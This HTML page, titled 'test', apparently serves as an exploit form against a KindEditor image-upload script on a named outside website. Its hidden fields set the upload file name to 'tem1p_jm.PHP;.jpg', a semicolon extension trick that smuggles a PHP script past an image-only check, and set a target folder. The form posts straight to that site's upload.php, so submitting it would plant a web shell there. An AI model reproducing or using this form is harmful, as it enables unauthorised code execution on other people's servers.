<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- TemplateBeginEditable name="doctitle" -->
<title>test</title>
<!-- TemplateEndEditable -->
<!-- TemplateBeginEditable name="head" -->
<!-- TemplateEndEditable -->
</head>

<body>
<form name="uploadForm" method="post" enctype="multipart/form-data" action="http://www.go-qf.com/kedit/upload_cgi/upload.php">
<input type="hidden" name="fileName" id="fileName" value="tem1p_jm.PHP;.jpg" />
<input type="hidden" name="attachPath" id="fileName" value="news/pics/" />

<select id="imageType" onchange="javascript:parent.KindImageType(this.value);document.getElementById('KE_IMAGEsubmitButton').focus();">
<option value="1" selected="selected">bendi</option>
< option value="2">yuancheng</option>
< /select>

<input type="text" id="imgLink" value="http://" maxlength="255" style="width:95%;border:1px solid #555555;display:none;" />
<input type="file" name="fileData" id="imgFile" size="14"style="border:1px solid #555555;" onclick="javascript:document.getElementById('imgLink').value='http://';" /></td>

<input type="text" name="imgTitle" id="imgTitle" value="" maxlength="100" style="width:95%;border:1px solid #555555;" />
<input type="text" name="imgWidth" id="imgWidth" value="0" maxlength="4" style="width:40px;border:1px solid #555555;" />
<input type="text" name="imgHeight" id="imgHeight" value="0" maxlength="4" style="width:40px;border:1px solid #555555;" />
<input type="text" name="imgBorder" id="imgBorder" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
<select id="imgAlign" name="imgAlign">
<option value="">duiqifangshi</option>
< option value="baseline">baseline</option>
< option value="top">top</option>
< option value="middle">middle</option>
< option value="bottom">bottom</option>
< option value="texttop">texttop</option>
< option value="absmiddle">absmiddle</option>
< option value="absbottom">absbottom</option>
< option value="left">left</option>
< option value="right">right</option>
< /select>
< input type="text" name="imgHspace" id="imgHspace" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
<input type="text" name="imgVspace" id="imgVspace" value="0" maxlength="1" style="width:20px;border:1px solid #555555;" />
<input type="submit" name="button" id="KE_IMAGEsubmitButton" value="OK" style="border:1px solid #555555;background-color:#AAAAAA;" /></form>

</body>
</html>
